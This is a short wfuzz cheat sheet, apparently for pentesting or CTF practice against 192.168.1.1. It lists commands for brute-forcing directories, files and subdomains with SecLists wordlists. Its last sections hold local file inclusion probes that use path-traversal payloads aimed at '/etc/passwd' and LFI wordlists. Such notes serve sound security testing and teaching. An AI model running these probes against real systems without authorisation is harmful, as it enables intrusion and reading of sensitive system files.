# wfuzz Enumeration

## Skip SSL Certificate Verification

```bash
wfuzz -c --ssl-no-check -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "https://192.168.1.1/FUZZ/"
```

## Directory Scan

```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "http://192.168.1.1/FUZZ/"
```

## File Scan

```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 "http://192.168.1.1/FUZZ"
```

## Subdomain Enumeration

```bash
wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.ctf.com" --sc 200 192.168.1.1
```

## Find LFI Parameter

```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404 "http://192.168.1.1/hidden/secret.php?FUZZ=../../../../../../etc/passwd"
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 "http://192.168.1.1/secret/evil.php?FUZZ=../../../../../../etc/passwd"
```

## Find the File through LFI (Windows)

```bash
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -u "http://192.168.1.1/index.php?view=FUZZ"
```

## Find the File through LFI (Linux)

```bash
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt "http://192.168.1.1/view?file=FUZZ"
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt "http://192.168.1.1/view?file=FUZZ"
